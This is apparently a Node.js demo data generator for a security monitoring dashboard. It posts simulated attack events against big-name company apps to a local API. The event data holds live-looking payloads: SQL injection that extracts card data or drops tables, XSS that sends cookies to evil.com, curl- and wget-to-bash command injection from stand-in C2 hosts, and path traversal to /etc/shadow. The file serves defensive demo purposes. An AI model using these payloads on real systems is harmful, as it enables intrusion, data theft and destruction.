/**
 * BlackNode Sentinel — Demo Data Generator
 * Real-world enterprise monitoring simulation
 *
 * Run: node server.js
 */

const http = require('http');

const DASHBOARD_URL = 'http://localhost:5004';

async function apiPost(path, data, token) {
  return new Promise((resolve, reject) => {
    const url = new URL(path, DASHBOARD_URL);
    const payload = JSON.stringify(data);
    const headers = { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) };
    if (token) headers['Authorization'] = `Bearer ${token}`;
    const req = http.request(url, { method: 'POST', headers }, (res) => {
      let body = '';
      res.on('data', (c) => body += c);
      res.on('end', () => { try { resolve(JSON.parse(body)); } catch { resolve({}); } });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

async function apiGet(path, token) {
  return new Promise((resolve, reject) => {
    const url = new URL(path, DASHBOARD_URL);
    const headers = {};
    if (token) headers['Authorization'] = `Bearer ${token}`;
    const req = http.request(url, { method: 'GET', headers }, (res) => {
      let body = '';
      res.on('data', (c) => body += c);
      res.on('end', () => { try { resolve(JSON.parse(body)); } catch { resolve({}); } });
    });
    req.on('error', reject);
    req.end();
  });
}

// ─── Real-world enterprise applications ───────────────────
const applications = [
  { name: 'Google Cloud Platform', url: 'https://cloud.google.com', language: 'python', framework: 'Flask', environment: 'production', description: 'Primary cloud infrastructure — API gateway, IAM, and billing services' },
  { name: 'Facebook Messenger API', url: 'https://graph.facebook.com', language: 'javascript', framework: 'Express', environment: 'production', description: 'Real-time messaging API handling 100B+ messages/day' },
  { name: 'Amazon AWS Console', url: 'https://aws.amazon.com', language: 'java', framework: 'Spring Boot', environment: 'production', description: 'AWS management console backend — EC2, S3, Lambda orchestration' },
  { name: 'Netflix Streaming CDN', url: 'https://netflix.com', language: 'go', framework: 'Gin', environment: 'production', description: 'Content delivery network edge nodes — Open Connect appliance management' },
  { name: 'Microsoft Azure Portal', url: 'https://portal.azure.com', language: 'python', framework: 'Django', environment: 'production', description: 'Azure portal authentication and resource management API' },
  { name: 'Stripe Payment Gateway', url: 'https://stripe.com', language: 'other', framework: 'Rails', environment: 'production', description: 'Payment processing API — PCI DSS Level 1 certified infrastructure' },
  { name: 'Uber Ride API', url: 'https://api.uber.com', language: 'go', framework: 'Gin', environment: 'production', description: 'Ride-hailing real-time dispatch and pricing engine' },
  { name: 'Twitter/X API Gateway', url: 'https://api.twitter.com', language: 'other', framework: 'Finagle', environment: 'production', description: 'Social media API — timeline, search, and streaming endpoints' },
  { name: 'Shopify Commerce Engine', url: 'https://shopify.com', language: 'other', framework: 'Rails', environment: 'production', description: 'E-commerce platform serving 4.4M+ merchants worldwide' },
  { name: 'Cloudflare Edge Network', url: 'https://cloudflare.com', language: 'other', framework: 'Actix', environment: 'production', description: 'CDN and DDoS mitigation — 310+ Tbps network capacity' },
];

// ─── Realistic attack scenarios per company ───────────────
const attacks = [
  // ── Google Cloud Platform ──
  { app: 0, eventType: 'sql_injection', severity: 'critical', source: { ip: '185.220.101.42', method: 'POST', path: '/v1/projects/-/tokens', userAgent: 'Python/3.11 requests/2.31' }, payload: { parameter: 'grant_type', value: "' UNION SELECT service_account_key,private_key_id,token FROM iam_credentials WHERE 1=1--" }, description: 'Union-based SQLi targeting IAM token endpoint — attempting to extract service account keys', blocked: true },
  { app: 0, eventType: 'sql_injection', severity: 'critical', source: { ip: '45.155.205.233', method: 'GET', path: '/v2/compute/instances?filter=', userAgent: 'Go-http-client/2.0' }, payload: { parameter: 'filter', value: "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='cloudsql')>0--" }, description: 'Blind SQLi enumerating Cloud SQL instance metadata', blocked: true },
  { app: 0, eventType: 'command_injection', severity: 'critical', source: { ip: '203.0.113.42', method: 'POST', path: '/v1/functions/deploy', userAgent: 'PostmanRuntime/7.36' }, payload: { parameter: 'runtime', value: "; curl http://c2.gcp-internal[.]xyz/payload.sh | bash" }, description: 'OS command injection via Cloud Functions deployment pipeline', blocked: true },
  { app: 0, eventType: 'anomaly', severity: 'high', source: { ip: '35.192.0.1', method: 'GET', path: '/v1/storage/buckets?maxResults=1000', userAgent: 'gcloud/482.0.0' }, payload: { parameter: 'behavior', value: 'Bulk enumeration of 2,400 GCS buckets from single service account' }, description: 'Abnormal storage enumeration — potential data exfiltration reconnaissance', blocked: true },

  // ── Facebook Messenger API ──
  { app: 1, eventType: 'xss', severity: 'high', source: { ip: '192.168.1.105', method: 'POST', path: '/v18.0/me/feed', userAgent: 'facebookexternalhit/1.1' }, payload: { parameter: 'message', value: '<svg/onload=fetch("https://evil.com/c?c="+document.cookie)>' }, description: 'DOM-based XSS via SVG injection in feed posts — cookie exfiltration attempt', blocked: true },
  { app: 1, eventType: 'xss', severity: 'medium', source: { ip: '203.0.113.50', method: 'POST', path: '/v18.0/me/comments', userAgent: 'Mozilla/5.0' }, payload: { parameter: 'comment', value: '<details open ontoggle=alert(document.domain)>' }, description: 'Stored XSS via HTML5 event handler in comment threads', blocked: true },
  { app: 1, eventType: 'ddos', severity: 'critical', source: { ip: '10.10.10.10', method: 'GET', path: '/', userAgent: 'botnet-http/3.1' }, payload: { parameter: 'vector', value: 'HTTP/2 Rapid Reset — 100,000 req/sec from 2,400 source IPs' }, description: 'CVE-2023-44487 HTTP/2 Rapid Reset DDoS attack on Graph API gateway', blocked: true },
  { app: 1, eventType: 'malware', severity: 'critical', source: { ip: '91.240.118.50', method: 'POST', path: '/v18.0/me/photos', userAgent: 'python-requests/2.28' }, payload: { parameter: 'file', value: 'webshell.php — Chameleon v3.1 encrypted PHP backdoor' }, description: 'PHP webshell upload via photo endpoint — persistence mechanism', blocked: true },

  // ── Amazon AWS Console ──
  { app: 2, eventType: 'sql_injection', severity: 'high', source: { ip: '91.240.118.172', method: 'POST', path: '/api/search/products', userAgent: 'Mozilla/5.0 (Windows NT 10.0)' }, payload: { parameter: 'query', value: "'; EXEC xp_cmdshell('curl http://evil.com/shell.sh | bash')--" }, description: 'SQLi with OS command execution via xp_cmdshell — targeting product database', blocked: true },
  { app: 2, eventType: 'brute_force', severity: 'high', source: { ip: '45.33.32.156', method: 'POST', path: '/api/auth/login', userAgent: 'python-requests/2.28' }, payload: { parameter: 'credentials', value: 'Credential stuffing — 2,847 attempts across 45 IAM account pairs' }, description: 'Distributed credential stuffing using RockYou2024 leaked database', blocked: true },
  { app: 2, eventType: 'ddos', severity: 'critical', source: { ip: '172.16.0.1', method: 'TCP', path: 'SYN flood', userAgent: 'hping3/2.0.0' }, payload: { parameter: 'vector', value: 'TCP SYN flood — 50,000 packets/sec targeting port 443' }, description: 'Volumetric SYN flood with spoofed source addresses — 120Gbps peak', blocked: true },
  { app: 2, eventType: 'path_traversal', severity: 'medium', source: { ip: '192.168.1.200', method: 'GET', path: '/api/static/', userAgent: 'python-requests/2.28' }, payload: { parameter: 'file', value: '..\\..\\..\\windows\\system32\\config\\sam' }, description: 'Windows SAM database extraction attempt via static file endpoint', blocked: true },

  // ── Netflix Streaming CDN ──
  { app: 3, eventType: 'sql_injection', severity: 'critical', source: { ip: '103.224.182.251', method: 'GET', path: '/api/user/profile?id=', userAgent: 'curl/8.4.0' }, payload: { parameter: 'id', value: "1; WAITFOR DELAY '0:0:5'--" }, description: 'Time-based blind SQLi on user profile API — response delay extraction', blocked: true },
  { app: 3, eventType: 'brute_force', severity: 'high', source: { ip: '198.51.100.78', method: 'POST', path: '/api/auth/ssh', userAgent: 'libssh/0.9.6' }, payload: { parameter: 'auth', value: 'SSH brute force — 15,000 attempts in 60 seconds from Tor exit node' }, description: 'Automated SSH brute force targeting CDN appliance management interface', blocked: true },
  { app: 3, eventType: 'command_injection', severity: 'critical', source: { ip: '185.220.100.252', method: 'POST', path: '/api/v1/convert', userAgent: 'Go-http-client/2.0' }, payload: { parameter: 'filename', value: '$(wget http://c2.netflix-internal[.]xyz/backdoor -O /tmp/.hidden && chmod +x /tmp/.hidden)' }, description: 'Command injection with reverse shell payload via video transcode endpoint', blocked: true },
  { app: 3, eventType: 'malware', severity: 'high', source: { ip: '185.220.101.100', method: 'GET', path: '/api/download/binary', userAgent: 'Go-http-client/2.0' }, payload: { parameter: 'url', value: 'Cobalt Strike beacon — https://cdn-secure[.]com/update.exe' }, description: 'C2 beacon download attempt — Cobalt Strike 4.9 reverse HTTPS payload', blocked: true },

  // ── Microsoft Azure Portal ──
  { app: 4, eventType: 'xss', severity: 'high', source: { ip: '172.16.0.88', method: 'GET', path: '/api/search?q=', userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X)' }, payload: { parameter: 'q', value: '<img src=x onerror="navigator.sendBeacon(\'https://evil.com\',JSON.stringify(localStorage))">' }, description: 'Reflected XSS targeting Azure AD token theft via localStorage exfiltration', blocked: true },
  { app: 4, eventType: 'path_traversal', severity: 'high', source: { ip: '10.0.0.99', method: 'GET', path: '/api/files/download?path=', userAgent: 'Wget/1.21.3' }, payload: { parameter: 'path', value: '../../../../etc/shadow' }, description: 'Path traversal targeting system authentication files on Azure portal backend', blocked: true },
  { app: 4, eventType: 'anomaly', severity: 'high', source: { ip: '192.168.50.100', method: 'POST', path: '/api/data/export', userAgent: 'python-requests/2.28' }, payload: { parameter: 'behavior', value: 'Data exfiltration — 2.3GB Azure AD export in 120 seconds' }, description: 'Large data transfer anomaly — potential Azure AD tenant data breach', blocked: true },
  { app: 4, eventType: 'port_scan', severity: 'info', source: { ip: '198.51.100.23', method: 'TCP', path: 'SYN stealth scan', userAgent: 'nmap/7.94' }, payload: { parameter: 'ports', value: '22,80,443,3306,5432,6379,8080,8443,9200,27017' }, description: 'Full TCP port scan from automated reconnaissance tool', blocked: false },

  // ── Stripe Payment Gateway ──
  { app: 5, eventType: 'sql_injection', severity: 'critical', source: { ip: '185.220.101.99', method: 'POST', path: '/v1/charges', userAgent: 'Ruby/3.2' }, payload: { parameter: 'amount', value: "1' OR '1'='1' UNION SELECT card_number,cvc,exp_month FROM payment_cards--" }, description: 'SQLi targeting payment card storage — PCI DSS breach attempt', blocked: true },
  { app: 5, eventType: 'brute_force', severity: 'critical', source: { ip: '45.33.32.200', method: 'POST', path: '/v1/auth/api_keys', userAgent: 'python-requests/2.31' }, payload: { parameter: 'api_key', value: 'API key brute force — sk_live_ prefix enumeration, 10,000 attempts' }, description: 'Stripe API key enumeration via live/test key brute force', blocked: true },
  { app: 5, eventType: 'anomaly', severity: 'high', source: { ip: '10.0.0.55', method: 'POST', path: '/v1/refunds', userAgent: 'Mozilla/5.0' }, payload: { parameter: 'behavior', value: 'Refund abuse — 47 refunds totaling $284,000 in 10 minutes' }, description: 'Automated refund fraud pattern — velocity abuse detection', blocked: true },

  // ── Uber Ride API ──
  { app: 6, eventType: 'brute_force', severity: 'high', source: { ip: '91.240.118.172', method: 'POST', path: '/api/auth/phone', userAgent: 'python-requests/2.28' }, payload: { parameter: 'phone', value: 'SMS OTP brute force — 5,000 verification attempts across 800 numbers' }, description: 'SMS OTP brute force targeting ride-hailing authentication', blocked: true },
  { app: 6, eventType: 'sql_injection', severity: 'high', source: { ip: '185.220.101.42', method: 'GET', path: '/api/trips?driver_id=', userAgent: 'Go-http-client/2.0' }, payload: { parameter: 'driver_id', value: "1' UNION SELECT name,phone,vehicle_plate FROM drivers WHERE 1=1--" }, description: 'SQLi extracting driver PII — names, phones, and license plates', blocked: true },
  { app: 6, eventType: 'anomaly', severity: 'medium', source: { ip: '172.16.0.1', method: 'POST', path: '/api/pricing/surge', userAgent: 'curl/8.4.0' }, payload: { parameter: 'behavior', value: 'Surge pricing manipulation — 50x multiplier from single GPS coordinate' }, description: 'Fare manipulation via GPS spoofing and surge multiplier injection', blocked: true },

  // ── Twitter/X API Gateway ──
  { app: 7, eventType: 'xss', severity: 'high', source: { ip: '203.0.113.42', method: 'POST', path: '/2/tweets', userAgent: 'python-tweepy/4.14' }, payload: { parameter: 'text', value: '<img src="x" onerror="fetch(\'https://evil.com/t\'+btoa(document.cookie))">' }, description: 'Stored XSS via tweet composition — browser session hijacking', blocked: true },
  { app: 7, eventType: 'ddos', severity: 'critical', source: { ip: '10.10.10.20', method: 'GET', path: '/2/timeline/home', userAgent: 'python-requests/2.28' }, payload: { parameter: 'vector', value: 'Application-layer DDoS — 50,000 authenticated requests/sec' }, description: 'Authenticated API flood using stolen OAuth tokens — Layer 7 attack', blocked: true },
  { app: 7, eventType: 'path_traversal', severity: 'medium', source: { ip: '192.168.1.100', method: 'GET', path: '/media/', userAgent: 'Mozilla/5.0' }, payload: { parameter: 'url', value: '../../etc/passwd' }, description: 'Path traversal via media CDN — attempting to access /etc/passwd', blocked: true },

  // ── Shopify Commerce Engine ──
  { app: 8, eventType: 'sql_injection', severity: 'critical', source: { ip: '45.155.205.233', method: 'POST', path: '/admin/api/products.json', userAgent: 'ShopifyAPI/1.0' }, payload: { parameter: 'title', value: "'; DROP TABLE customers; ALTER TABLE orders ADD COLUMN admin_token VARCHAR(255)--" }, description: 'Destructive SQLi — DROP TABLE on customer database with admin token injection', blocked: true },
  { app: 8, eventType: 'brute_force', severity: 'high', source: { ip: '103.224.182.251', method: 'POST', path: '/admin/auth', userAgent: 'python-requests/2.31' }, payload: { parameter: 'credentials', value: 'Shopify admin brute force — 8,000 attempts using credential permutations' }, description: 'Automated admin panel brute force targeting merchant dashboard', blocked: true },
  { app: 8, eventType: 'xss', severity: 'high', source: { ip: '91.240.118.50', method: 'POST', path: '/cart/add', userAgent: 'Mozilla/5.0' }, payload: { parameter: 'properties', value: '<script>fetch("https://evil.com/steal?data="+JSON.stringify(window))</script>' }, description: 'Stored XSS in cart properties — customer session hijacking', blocked: true },
  { app: 8, eventType: 'anomaly', severity: 'medium', source: { ip: '172.16.0.50', method: 'GET', path: '/admin/orders.json?limit=250', userAgent: 'python-requests/2.28' }, payload: { parameter: 'behavior', value: 'Bulk order export — 50,000 orders in 60 seconds from single IP' }, description: 'Abnormal data access pattern — potential merchant data theft', blocked: true },

  // ── Cloudflare Edge Network ──
  { app: 9, eventType: 'ddos', severity: 'critical', source: { ip: '10.10.10.30', method: 'GET', path: '/', userAgent: 'Mirai/1.0' }, payload: { parameter: 'vector', value: 'Volumetric UDP flood — 340Gbps peak from IoT botnet' }, description: 'Mirai botnet DDoS — UDP amplification via DNS/NTP reflection', blocked: true },
  { app: 9, eventType: 'ddos', severity: 'critical', source: { ip: '172.16.0.10', method: 'POST', path: '/api/v4/zones', userAgent: 'python-requests/2.31' }, payload: { parameter: 'vector', value: 'Slowloris + HTTP POST flood — 10,000 concurrent slow connections' }, description: 'Hybrid Layer 7 DDoS — slowloris keepalive abuse with POST flood', blocked: true },
  { app: 9, eventType: 'command_injection', severity: 'critical', source: { ip: '185.220.101.42', method: 'POST', path: '/api/v4/worker/scripts', userAgent: 'Wrangler/3.50.0' }, payload: { parameter: 'script', value: "addEventListener('fetch',e=>e.respondWith(fetch('https://c2.cf-internal[.]xyz/cmd')))" }, description: 'Cloudflare Worker code injection — reverse proxy to C2 server', blocked: true },
  { app: 9, eventType: 'port_scan', severity: 'low', source: { ip: '45.155.205.100', method: 'TCP', path: 'masscan scan', userAgent: 'masscan/1.3.2' }, payload: { parameter: 'ports', value: 'Top 1000 ports in 3.2 seconds — entire /16 range' }, description: 'Internet-wide masscan reconnaissance across Cloudflare edge IPs', blocked: false },
];

async function main() {
  console.log('BLACKNODE SENTINEL — REAL-WORLD DEMO DATA');
  console.log('='.repeat(60) + '\n');

  // Login
  console.log('[1/4] Authenticating...');
  const loginRes = await apiPost('/api/auth/login', { email: 'test@test.com', password: 'Test123!' });
  const token = loginRes.data?.token;
  if (!token) {
    console.error('ERROR: Login failed. Ensure backend is running on port 5004.');
    process.exit(1);
  }
  console.log('      OK\n');

  // Create applications
  console.log('[2/4] Registering monitored applications...');
  const appIds = [];
  for (const app of applications) {
    const res = await apiPost('/api/applications', app, token);
    const id = res.data?._id;
    if (id) {
      appIds.push(id);
      console.log('  +  ' + app.name);
    }
  }
  console.log('      ' + appIds.length + ' applications registered\n');

  // Send attack events
  console.log('[3/4] Injecting security events...\n');
  let sent = 0;
  for (const attack of attacks) {
    const appId = appIds[attack.app];
    if (!appId) continue;

    try {
      await apiPost('/api/events', {
        applicationId: appId,
        eventType: attack.eventType,
        severity: attack.severity,
        source: attack.source,
        payload: attack.payload,
        description: attack.description,
        blocked: attack.blocked,
        mlScore: 0.7 + Math.random() * 0.3,
      }, token);
      sent++;
      const sev = attack.severity.toUpperCase().padEnd(8);
      console.log('  [' + sev + '] ' + attack.eventType + ' — ' + attack.description.substring(0, 55) + '...');
      await new Promise(r => setTimeout(r, 80));
    } catch (err) {
      console.error('  FAILED: ' + err.message);
    }
  }

  console.log('\n      ' + sent + '/' + attacks.length + ' events injected\n');

  // Summary
  console.log('[4/4] Summary\n');
  console.log('='.repeat(60));
  console.log('DEMO DATA READY');
  console.log('='.repeat(60));
  console.log('');
  console.log('  Open http://localhost:3000 and login:');
  console.log('  Email: test@test.com');
  console.log('  Password: Test123!');
  console.log('');
  console.log('  Monitored Companies (' + applications.length + '):');
  applications.forEach((a, i) => console.log('    ' + (i + 1) + '. ' + a.name));
  console.log('');
  console.log('  Attack Events (' + attacks.length + '):');
  const types = {};
  attacks.forEach(a => { types[a.eventType] = (types[a.eventType] || 0) + 1; });
  Object.entries(types).forEach(([k, v]) => console.log('    - ' + k.replace(/_/g, ' ') + ': ' + v));
  console.log('');
  console.log('  Dashboard pages:');
  console.log('    Dashboard    — Real-time threat overview');
  console.log('    Applications — Enterprise app registry');
  console.log('    Events       — Security event forensics');
  console.log('    Threat Intel — CVE and OTX feeds');
  console.log('    Network      — Infrastructure monitoring');
  console.log('    Settings     — Security configuration');
  console.log('');
}

main().catch(err => {
  console.error('FATAL: ' + err.message);
  console.error('Ensure Docker stack is running: docker-compose up -d');
});
